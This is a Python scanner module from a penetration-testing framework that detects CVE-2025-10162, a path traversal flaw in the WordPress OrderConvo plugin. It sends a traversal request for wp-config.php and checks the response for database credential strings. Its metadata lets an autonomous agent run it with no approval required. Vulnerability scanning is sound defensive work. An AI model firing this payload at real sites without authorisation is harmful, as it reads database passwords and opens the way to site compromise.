#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WooCommerce OrderConvo WordPress plugin \u003C 14 contains a path traversal vulnerability caused by improper v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress OrderConvo < 14 - Path Traversal Detection',
        'description': 'WooCommerce OrderConvo WordPress plugin \\u003C 14 contains a path traversal vulnerability caused by improper validation of file download paths, letting unauthenticated attackers read or download arbitrary files remotely',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'modules': [
            'exploits/multi/http/wp_orderconvo_cve_2025_10162_path_traversal',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wp', 'wp-plugin', 'wordpress', 'woocommerce', 'orderconvo', 'wooconvo', 'lfi', 'traversal', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f878615d-955d-4365-87e0-6c928f548986/',
            'https://wordpress.org/plugins/admin-and-client-message-after-order-for-woocommerce/',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-10162',
        ],
        'cve': 'CVE-2025-10162',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress OrderConvo < 14 - Path Traversal detected",
                path='/wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php',
            )
            return True
        return False

